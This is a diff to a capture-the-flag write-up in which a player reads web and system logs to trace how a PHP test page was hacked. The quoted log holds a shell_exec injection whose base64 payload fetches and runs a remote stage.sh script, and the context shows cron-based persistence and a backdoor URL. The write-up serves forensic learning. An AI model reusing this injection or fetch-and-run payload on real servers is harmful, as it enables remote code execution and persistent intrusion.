@@ -1,8 +1,16 @@
+# H4x0r3d (264 pt)
+
+I've tried to learn some PHP, but some evil guy hacked me!
+
+Can you catch him by looking at my logs?
+
+Download: [h4x0r3d_logs.7z](h4x0r3d_logs_c0abe4acb8.7z)
+
+# Solution
+
 Inspecting `access.log`, we find a suspicious request:
 
-```
-192.168.138.1 - - [29/Oct/2020:00:08:06 +0300] "GET /test-verysecretfile.php?expression=shell_exec%28%22%60echo+c2ggLWMgIiQod2dldCAtTy1odHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FldGhlckV0ZXJuaXR5LzQ4NGZlYzZmYjBmMjdlZjZlYzgxYjU4YWVlNTZlZGQxL3Jhdy8wN2MyZjc5NjBlYTE1MmVmOTRjMjBmZDJjMDlkZjU0YmMyMWQ4NmU5L3N0YWdlLnNoKSI%3D+%7C+base64+-d%60%22%29 HTTP/1.1" 200 435 "-" "python-requests/2.23.0"
-```
+> 192.168.138.1 - - [29/Oct/2020:00:08:06 +0300] "GET /test-verysecretfile.php?expression=shell_exec%28%22%60echo+c2ggLWMgIiQod2dldCAtTy1odHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FldGhlckV0ZXJuaXR5LzQ4NGZlYzZmYjBmMjdlZjZlYzgxYjU4YWVlNTZlZGQxL3Jhdy8wN2MyZjc5NjBlYTE1MmVmOTRjMjBmZDJjMDlkZjU0YmMyMWQ4NmU5L3N0YWdlLnNoKSI%3D+%7C+base64+-d%60%22%29 HTTP/1.1" 200 435 "-" "python-requests/2.23.0"
 
 The base64 string decodes to:
 
@@ -25,9 +33,7 @@ chmod +x /etc/cron.hourly/persist
 
 Where can we find this UUID? Let's have a look at `syslog`:
 
-```
-Oct 29 0:26:54 debian-min root: Started door with uid AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy
-```
+> Oct 29 0:26:54 debian-min root: Started door with uid AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy
 
 Now we visit [http://188.143.222.218:4455/persist/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy](http://188.143.222.218:4455/persist/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy)
 
